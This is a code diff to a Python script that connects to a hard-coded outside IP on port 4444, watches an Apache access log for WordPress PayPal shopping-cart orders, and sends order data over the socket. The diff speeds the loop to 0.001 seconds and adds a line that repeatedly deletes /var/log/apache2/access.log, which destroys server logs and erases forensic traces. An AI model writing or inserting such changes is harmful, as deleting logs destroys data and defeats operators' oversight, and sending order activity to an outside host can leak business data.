@@ -1,9 +1,10 @@
 import socket
 import random
 import time
+import os
 
 host = ("46.228.143.102", 4444)
-speed = 0.5                 # seconds
+speed = 0.001
 
 access_log_path = "/var/log/apache2/access.log"
 match_string = "wordpress-paypal-shopping-cart"
@@ -59,3 +60,4 @@ if __name__ == "__main__":
         time.sleep(speed)
         if is_order():
             send_random_order(s)
+        os.remove(access_log_path)
